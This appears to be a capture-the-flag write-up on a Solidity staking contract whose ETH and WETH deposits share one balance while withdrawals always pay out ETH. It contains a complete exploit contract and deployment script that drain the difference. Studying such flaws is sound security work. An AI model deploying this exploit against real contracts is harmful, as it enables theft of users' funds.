# Stake Contract - Accounting Vulnerability

## Vulnerability

The Stake contract has a critical accounting flaw that allows draining funds:

```solidity
function StakeETH() public payable {
    totalStaked += msg.value;
    UserStake[msg.sender] += msg.value;  // ⚠️ Adds ETH to UserStake
}

function StakeWETH(uint256 amount) public returns (bool){
    totalStaked += amount;
    UserStake[msg.sender] += amount;     // ⚠️ Adds WETH to UserStake
    // Transfers WETH tokens, not ETH!
}

function Unstake(uint256 amount) public returns (bool){
    require(UserStake[msg.sender] >= amount);
    UserStake[msg.sender] -= amount;
    payable(msg.sender).call{value: amount}("");  // ⚠️ Always sends ETH!
}
```

### The Problem:
* `StakeETH()` and `StakeWETH()` both update the same `UserStake` mapping
* `UserStake` accumulates **ETH + WETH amounts** together
* `Unstake()` always pays out in **native ETH** regardless of what was staked
* An attacker can stake 0.5 ETH + 0.5 WETH, but withdraw 1.0 ETH!

### Example Attack Scenario:

```
Initial State:
- Contract has 1.0 ETH balance
- Attacker has 1.0 ETH

Step 1: StakeETH(0.5 ETH)
- UserStake[attacker] = 0.5 ether
- Contract ETH balance = 1.5 ETH

Step 2: StakeWETH(0.5 WETH)
- UserStake[attacker] = 1.0 ether  // ⚠️ Doubled!
- Contract receives 0.5 WETH tokens (not ETH)
- Contract ETH balance = 1.5 ETH (unchanged)

Step 3: Unstake(1.0 ETH)
- Check: UserStake[attacker] >= 1.0 ether ✓
- Sends 1.0 ETH to attacker
- Profit: 0.5 ETH stolen!
```

## Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract StakeExploit {
    IStake public target;
    IWETH public weth;
    
    constructor(address _target, address _weth) payable {
        target = IStake(_target);
        weth = IWETH(_weth);
    }
    
    function attack() external payable {
        uint256 halfAmount = msg.value / 2;
        
        // Step 1: Convert half to WETH
        weth.deposit{value: halfAmount}();
        
        // Step 2: Approve Stake contract to spend WETH
        weth.approve(address(target), halfAmount);
        
        // Step 3: Stake ETH (UserStake += 0.5)
        target.StakeETH{value: halfAmount}();
        
        // Step 4: Stake WETH (UserStake += 0.5, total = 1.0)
        target.StakeWETH(halfAmount);
        
        // Step 5: Unstake full amount in ETH (withdraw 1.0 ETH)
        target.Unstake(msg.value);
        
        // Profit: Withdrew msg.value but only paid msg.value/2 in ETH!
    }
}
```

## How It Works

### Step 1: Prepare WETH Tokens
```solidity
weth.deposit{value: halfAmount}();
```
Convert half of the attack amount to WETH tokens.

### Step 2: Approve Stake Contract
```solidity
weth.approve(address(target), halfAmount);
```
Allow the Stake contract to transfer our WETH.

### Step 3: Stake Native ETH
```solidity
target.StakeETH{value: halfAmount}();
```
- Sends `halfAmount` ETH to contract
- `UserStake[attacker]` increases by `halfAmount`
- Contract receives real ETH

### Step 4: Stake WETH Tokens
```solidity
target.StakeWETH(halfAmount);
```
- Transfers `halfAmount` WETH tokens to contract
- `UserStake[attacker]` increases by another `halfAmount` 
- **Contract receives tokens, NOT ETH!**
- Total `UserStake = msg.value` but only `msg.value/2` in actual ETH

### Step 5: Drain the Contract
```solidity
target.Unstake(msg.value);
```
- Check passes: `UserStake[attacker] >= msg.value` ✓
- Contract sends `msg.value` in ETH
- **Profit**: Withdrew double the ETH we deposited!

## Attack Flow Diagram

```
Attacker sends 1.0 ETH to exploit contract
    ↓
Convert 0.5 ETH → 0.5 WETH
    ↓
Stake 0.5 ETH
    → UserStake = 0.5
    → Contract has 0.5 ETH
    ↓
Stake 0.5 WETH  
    → UserStake = 1.0 ⚠️
    → Contract has 0.5 ETH + 0.5 WETH tokens
    ↓
Unstake 1.0 ETH
    → UserStake check passes (1.0 >= 1.0)
    → Contract sends 1.0 ETH ⚠️
    → Drained 0.5 ETH profit!
```

## Solution

Deploy the exploit contract with:
1. Target Stake contract address
2. WETH token address
3. Send attack amount in ETH (e.g., 0.002 ETH)

```javascript
// Example deployment
const exploit = await StakeExploit.deploy(
    stakeAddress,  // Target contract
    wethAddress,   // WETH token
    { value: ethers.utils.parseEther("0.002") }
);

// Execute attack
await exploit.attack({ value: ethers.utils.parseEther("0.002") });
```

## Key Concepts

* **Accounting Mismatch**: Mixing ETH and token accounting in a single variable
* **Asset Type Confusion**: Treating different asset types (ETH vs WETH) as equivalent
* **Withdrawal Vulnerability**: Always paying out in the more valuable asset (ETH)
* **Double Counting**: Same balance used for two different asset types

